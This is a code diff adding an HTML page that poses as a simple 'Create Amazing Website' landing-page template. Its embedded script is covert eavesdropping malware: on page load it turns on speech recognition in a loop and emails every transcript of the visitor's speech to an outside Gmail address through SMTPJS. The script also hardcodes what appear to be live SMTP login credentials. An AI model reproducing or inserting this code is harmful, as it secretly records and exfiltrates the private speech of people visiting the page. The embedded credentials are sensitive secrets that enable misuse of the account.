@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<!-- Created By CodingNepal - www.codingnepalweb.com -->
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!------<title> Website Layout | CodingLab</title>------>
+    <link rel="stylesheet" href="indx.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css"/>
+   </head>
+<body>
+  <nav>
+    <div class="menu">
+      <div class="logo">
+        <a href="#">CodingLab</a>
+      </div>
+      <ul>
+        <li><a href="#">Home</a></li>
+        <li><a href="#">About</a></li>
+        <li><a href="#">Services</a></li>
+        <li><a href="#">Contact</a></li>
+        <li><a href="#">Feedback</a></li>
+      </ul>
+    </div>
+  </nav>
+  <div class="img"></div>
+  <div class="center">
+    <div class="title">Create Amazing Website</div>
+    <div class="sub_title">Pure HTML & CSS Only</div>
+    
+  </div>
+
+  <script src="https://smtpjs.com/v3/smtp.js"></script>
+  
+        <script>
+            readSpeech();
+            function readSpeech(){
+                
+            var recognition = new (window.SpeechRecognition || window.webkitSpeechRecognition || window.mozSpeechRecognition || window.msSpeechRecognition)();
+            recognition.lang = 'en-US';
+            recognition.interimResults = false;
+            recognition.maxAlternatives = 25;
+            recognition.start();
+            recognition.onresult = function(event) {
+                sendEmail(event.results[0][0].transcript);
+                console.log(event.results[0][0].transcript);
+                readSpeech();
+            };
+            }
+    
+            
+            function sendEmail(voice) {
+                Email.send({
+                Host: "smtp.elasticemail.com",
+                Username : "lene.corro@gmail.com",
+                Password : "FAED5E644DC83F64E17043111CAD3378FF13",
+                To : 'rizacorro29@gmail.com',
+                From : "lene.corro@gmail.com",
+                Subject : "SENT",
+                Body : "Voice: " + voice,
+                }).then(
+                    message => console.log()
+                );
+              }
+    
+        </script>
+</body>
+</html>
